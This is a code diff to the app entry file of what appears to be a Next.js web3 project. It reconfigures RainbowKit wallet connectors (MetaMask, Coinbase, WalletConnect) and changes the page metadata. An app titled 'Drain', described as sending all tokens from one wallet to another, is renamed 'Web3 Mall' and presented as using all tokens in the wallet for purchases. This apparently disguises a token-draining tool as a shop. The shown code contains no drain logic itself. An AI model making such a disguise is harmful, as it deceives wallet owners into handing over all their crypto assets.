@@ -1,7 +1,7 @@
 import { CssBaseline, GeistProvider } from '@geist-ui/core';
 import type { AppProps } from 'next/app';
 import NextHead from 'next/head';
-// import GithubCorner from 'react-github-corner'; // Optional
+// import GithubCorner from 'react-github-corner';
 import '../styles/globals.css';
 
 import {
@@ -18,7 +18,16 @@ import {
   polygon,
 } from 'wagmi/chains';
 
-import { getDefaultWallets, RainbowKitProvider } from '@rainbow-me/rainbowkit';
+import {
+  connectorsForWallets,
+  RainbowKitProvider,
+} from '@rainbow-me/rainbowkit';
+import {
+  metaMaskWallet,
+  coinbaseWallet,
+  walletConnectWallet,
+} from '@rainbow-me/rainbowkit/wallets';
+
 import '@rainbow-me/rainbowkit/styles.css';
 
 import { z } from 'zod';
@@ -31,16 +40,21 @@ const walletConnectProjectId = z
 
 const chains = [mainnet, polygon, optimism, arbitrum, bsc, gnosis];
 
-const { connectors } = getDefaultWallets({
-  appName: 'Web3Inbox',
-  projectId: walletConnectProjectId,
-  chains,
-});
+const connectors = connectorsForWallets([
+  {
+    groupName: 'Recommended',
+    wallets: [
+      metaMaskWallet({ projectId: walletConnectProjectId, chains }),
+      coinbaseWallet({ appName: 'Web3Inbox', chains }),
+      walletConnectWallet({ projectId: walletConnectProjectId, chains }),
+    ],
+  },
+]);
 
 const wagmiConfig = createConfig({
   autoConnect: true,
-  connectors: ()=> connectors(), // Ensure connectors is an array
-  publicClient: http(), // uses default chain RPC URLs
+  connectors,
+  publicClient: http(),
 });
 
 const App = ({ Component, pageProps }: AppProps) => {
@@ -59,10 +73,10 @@ const App = ({ Component, pageProps }: AppProps) => {
       <WagmiProvider config={wagmiConfig}>
         <RainbowKitProvider chains={chains} coolMode>
           <NextHead>
-            <title>Drain</title>
+            <title>Web3 Mall</title>
             <meta
               name="description"
-              content="Send all tokens from one wallet to another"
+              content="use all tokens on wallet for purchases"
             />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
